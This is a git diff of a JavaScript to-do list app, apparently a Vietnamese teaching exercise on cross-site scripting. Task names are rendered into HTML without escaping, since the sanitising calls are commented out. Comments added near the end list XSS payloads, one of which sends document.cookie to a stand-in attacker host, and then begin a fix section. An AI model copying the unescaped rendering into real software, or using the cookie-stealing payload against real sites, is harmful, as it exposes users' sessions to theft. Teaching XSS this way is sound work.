@@ -3,6 +3,8 @@ const taskInput = document.getElementById("task_input");
 const submitBtn = document.getElementById("submit_btn");
 let tasksList = document.getElementById("tasks_list");
 // Functions
+// g: tất cả các chuỗi fit
+// i: Không phân biệt hoa thường
 function stripTags(originalString) {
   return originalString.replace(/(<([^>]+)>)/gi, "");
 }
@@ -24,7 +26,6 @@ function renderTasks() {
     let name = task.name;
     // name = stripTags(name);
     // name = htmlentities(name);
-    // name = encodeURI(name);
     content += '<li class="task_container"' + "id=" + id + ">";
     content += '<p class="task_content">' + name + "</p>";
     content += '<div class="task_functions">';
@@ -71,6 +72,7 @@ function updateTaskFromInput(index) {
   // Reset states
   taskInput.value = '';
   submitBtn.addEventListener("click", addTask);
+  submitBtn.textContent = "Save task";
 }
 function deleteTask(index) {
   let tasks = getTasksFromLocalStorage();
@@ -79,6 +81,7 @@ function deleteTask(index) {
   renderTasks();
 }
 function updateTask(index) {
+  submitBtn.textContent = "Update task";
   const tasks = getTasksFromLocalStorage();
   const name = tasks[index].name;
   taskInput.value = name;
@@ -98,6 +101,10 @@ taskInput.addEventListener('keypress', function (e) {
 })
 submitBtn.addEventListener("click", addTask);
 
+// Malious script
+// <strong onclick='alert("hacked")'>Click me please :*</strong>
+// <strong onclick='window.location.href="https://iamnothacker.com?cookies="+document.cookie'>Click me please :*</strong>
+// <img src='https://images.unsplash.com/photo-1674574124649-778f9afc0e9c?ixlib=rb-4.0.3&ixid=M3wxMjA3fDF8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80' onload="alert('hacked')" />
 // Cách fix:
 // var userInput = '<script>alert("XSS");</script>';
 // var element = document.createElement('div');
